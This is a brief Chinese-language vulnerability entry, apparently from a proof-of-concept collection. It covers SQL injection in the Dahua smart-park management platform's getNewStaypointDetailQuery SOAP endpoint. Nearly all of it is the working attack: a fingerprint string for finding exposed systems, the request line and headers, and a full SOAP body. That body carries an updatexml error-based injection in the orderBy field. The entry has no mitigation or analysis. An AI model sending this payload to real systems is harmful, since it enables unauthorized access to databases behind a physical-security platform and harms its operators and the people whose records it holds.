# 大华智慧园区综合管理平台getNewStaypointDetailQuery存在SQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1`
- **关键头**：`Host: xxx`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 491`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<car:getNewStaypointDetailQuery>
<!--type: string-->
<searchJson>{}</searchJson>
<!--type: string-->
<pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,md5(123456),0x7e),1)--"}</pageJson>
<!--type: string-->
<extend>quae divum incedo</extend>
</car:getNewStaypointDetailQuery>
</soapenv:Body>
</soapenv:Envelope>
```